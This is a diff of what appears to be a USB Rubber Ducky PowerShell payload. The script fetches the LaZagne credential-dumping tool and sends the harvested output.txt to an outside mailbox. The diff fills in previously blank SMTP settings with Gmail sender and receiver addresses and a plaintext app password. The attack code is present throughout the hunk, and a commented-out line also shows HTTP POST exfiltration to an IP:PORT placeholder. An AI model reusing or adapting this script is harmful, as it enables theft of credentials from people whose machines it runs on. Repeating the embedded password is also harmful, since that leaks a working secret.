@@ -99,15 +99,15 @@ Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download
 #Invoke-WebRequest -Uri "http://IP:PORT0" -Method POST -Body Get-Content "$dir\output.txt"
 
 #Mail Exfiltration
-$smtp = "" # Put SMTP SERVER HERE, TESTED WITH GOOGLES
-$From = "" # Put the SENDER HERE
-$To = "" # Put the RECEIVER HERE
-$smtp = "" # PUT YOUR SMTP SERVER HERE (TESTED WITH GOOGLE)
+$smtp = "smtp.gmail.com" # Put SMTP SERVER HERE, TESTED WITH GOOGLES
+$From = "ghostglitch68@gmail.com" # Put the SENDER HERE
+$To = "smartguy2093@gmail.com" # Put the RECEIVER HERE
+$smtp = "smtp.gmail.com" # PUT YOUR SMTP SERVER HERE (TESTED WITH GOOGLE)
 $Subject = "Ducky Rapport"
 $Body = "Hi, here is the Rapport"
 
 # The password is an app-specific password if you have 2-factor-auth enabled
-$Password = "" | ConvertTo-SecureString -AsPlainText -Force
+$Password = "cztidekictcsxtpt" | ConvertTo-SecureString -AsPlainText -Force
 $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $From, $Password
 # The smtp server used to send the file
 Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -Attachments "$dir\output.txt" -SmtpServer $smtp -port 587 -UseSsl -Credential $Credential
